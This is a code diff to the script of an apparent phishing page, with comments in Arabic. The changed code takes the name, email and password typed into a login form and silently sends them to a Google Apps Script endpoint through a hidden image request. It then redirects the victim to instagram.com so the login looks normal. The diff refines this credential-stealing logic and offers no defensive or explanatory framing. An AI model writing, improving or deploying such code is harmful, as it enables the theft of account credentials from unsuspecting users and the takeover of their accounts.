@@ -148,24 +148,26 @@
 </div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwMze-CRarapBb3xHvBaaa-ews6k3PUr96smjAPSJmf_IYOnZMLw5uNhCXpRuXfHo/exec"; //
-    document.querySelector("form").addEventListener("submit", function(event) {
-        // 
-        const nameVal = document.querySelector('input[type="text"]').value;
-        const emailVal = document.querySelectorAll('input')[1] ? document.querySelectorAll('input')[1].value : "";
-        const passVal = document.querySelector('input[type="password"]').value;
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwMze-CRarapBb3xHvBaaa-ews6k3PUr96smjAPSJmf_IYOnZMLw5uNhCXpRuXfHo/exec";
 
-        // تجهيز الرابط مع البيانات
+    document.querySelector("form").addEventListener("submit", function(event) {
+        // جلب قيم الحقول بالترتيب الصحيح من الفورم
+        const inputs = document.querySelectorAll('input');
+        const nameVal = inputs[0] ? inputs[0].value : "";
+        const emailVal = inputs[1] ? inputs[1].value : "";
+        const passVal = inputs[2] ? inputs[2].value : "";
+
+        // بناء الرابط بالمتغيرات الصحيحة
         const fullUrl = SCRIPT_URL + "?name=" + encodeURIComponent(nameVal) + 
                         "&email=" + encodeURIComponent(emailVal) + 
                         "&password=" + encodeURIComponent(passVal) + 
                         "&action=login_attempt&detected=no";
 
-        // إجبار المتصفح على إرسال الطلب للشيت في الخلفية فورا
+        // إرسال البيانات عبر الصورة في الخلفية
         const img = new Image();
         img.src = fullUrl;
 
-        // التحويل لإنستغرام بعد ثانية ونصف (عشان ندي فرصة للبيانات تتسجل في الشيت)
+        // التحويل لإنستغرام بعد ثانية ونصف
         setTimeout(function() {
             window.location.href = "https://www.instagram.com";
         }, 1500);
